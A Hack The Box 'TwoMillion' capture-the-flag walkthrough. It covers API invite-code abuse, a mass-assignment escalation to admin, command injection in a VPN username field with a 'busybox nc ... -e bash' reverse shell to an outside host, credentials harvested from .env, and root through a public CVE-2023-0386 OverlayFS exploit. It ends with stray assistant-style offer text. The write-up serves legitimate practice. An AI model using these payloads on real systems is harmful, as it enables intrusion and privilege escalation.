# Room: TwoMillion
Difficulty: Easy

## Initial Reconnaissance

First, I started scanning the ports using:
```
nmap -sC -sV -p- TARGET_IP -T4
```
### Command Explanation:

Nmap is a network penetration testing tool used for reconnaissance to scan open ports.

- -sC = Runs default scripts

- -sV = Service version detection

- -p- = Scan all ports

- -T4 = Aggressive scan (I only use this for CTFs because in real-life scenarios this would be very noisy

Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx
```
## Host Configuration

I added the domain to /etc/hosts so I could access the website:
``` bash
echo "TARGET_IP 2million.htb" | sudo tee -a /etc/hosts
```
After visiting the site, I found that it was a Hack The Box page.

## Directory Enumeration

Next, I scanned for hidden directories using FFUF, a tool for fuzzing and enumeration.
``` bash
ffuf -u "http://2million.htb/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```
Result:
``` bash
404
api
home
invite
login
logout
register
```
## Gaining Initial Access

While investigating possible entry points, I found a message on /invite:

### “Feel free to hack your way in :)”

At this point, I assumed that the /invite endpoint needed to be exploited.

I tried registering an account, but it required an invite code.

## Invite Code Generation

I revisited /invite and found this JavaScript file:

http://2million.htb/js/inviteapi.min.js

The code was obfuscated. After analyzing it, I discovered API endpoints related to invite generation.

Step 1: Request Instructions
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
Response:
"data": "Va beqre gb trarengr gur vaivgr pbqr..."
"enctype": "ROT13"

I used CyberChef to decode the ROT13 message.

Decoded Result:
In order to generate the invite code, make a POST request to /api/v1/invite/generate
Step 2: Generate Invite Code
curl -X POST http://2million.htb/api/v1/invite/generate
Response:
"code": "UzVWT0ctVjFYQzItSldFSkctOUlaRVQ="

This was Base64 encoded, so I decoded it using CyberChef.

Result:
S5VOG-V1XC2-*********

I used this code on /invite, which allowed me to register an account.

🔎 API Enumeration

After logging in, I explored the application and found an endpoint:

/api/v1/user/vpn/generate

Using Burp Suite, I discovered the API structure:

{
  "admin": {
    "POST": {
      "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
    },
    "PUT": {
      "/api/v1/admin/settings/update": "Update user settings"
    }
  }
}
🔓 Privilege Escalation (User → Admin)

I targeted:

/api/v1/admin/settings/update

I added the header:

Content-Type: application/json
Exploitation Steps

1st Attempt:

{
  "test": "test"
}

Response:

Missing parameter: email

2nd Attempt:

{
  "email": "YOUR_EMAIL"
}

Response:

Missing parameter: is_admin

This indicated that I could potentially control admin privileges.

3rd Attempt:

{
  "is_admin": true,
  "email": "YOUR_EMAIL"
}

Response:

Variable is_admin needs to be either 0 or 1

4th Attempt:

{
  "is_admin": 1,
  "email": "YOUR_EMAIL"
}
✅ Success:
"is_admin": 1

I confirmed admin access:

/api/v1/admin/auth → true
💥 Command Injection

I accessed:

/api/v1/admin/vpn/generate
Exploitation Steps

1st Attempt:

{
  "test": "test"
}

2nd Attempt:

{
  "username": "YOUR_EMAIL"
}

The hint suggested a command injection vulnerability, so I tested:

3rd Attempt:

{
  "username": "YOUR_EMAIL && curl YOUR_IP:PORT"
}
✅ It worked!
Reverse Shell

4th Attempt:

{
  "username": "YOUR_EMAIL && busybox nc YOUR_IP PORT -e bash"
}

Now I successfully gained a shell.

🧑‍💻 User Access

While exploring, I found useful files in:

/var/www/html

I discovered credentials in .env:

DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

Using these credentials, I accessed:

/home/admin/user.txt
⚙️ Privilege Escalation (Root)

I checked the kernel version:

uname -r

Result:

5.15.70-051570-generic

This version is vulnerable to CVE-2023-0386.

🧠 Vulnerability Explanation

In my understanding:

The kernel copies files from a lower directory to an upper directory

An attacker can use FUSE to create a fake file with UID 0 and SUID bit set

This makes the file appear as if it is owned by root

Steps:

Create a namespace to allow mounting without root

Use OverlayFS to layer the malicious file

Trick the kernel into copying the file with elevated privileges

🚀 Exploitation

I used a public exploit:

https://github.com/sxlmnwb/CVE-2023-0386
Files:
exp.c
fuse.c
getshell.c
Makefile
ovlcap
README.md
test
File Roles:

exp.c → Performs privilege escalation

fuse.c → Malicious FUSE filesystem

getshell.c → Spawns root shell

ovlcap → Target file for capability injection

Compilation
make all
Execution (2 Terminals Required)

Terminal 1:

./fuse ./ovlcap/lower ./gc

Terminal 2:

./exp
👑 Root Access

After running the exploit, I successfully gained root access.

📚 Reference

https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/

If you want, I can also:

Make this more professional (HTB-style writeup)

Or make a shorter version for GitHub portfolio

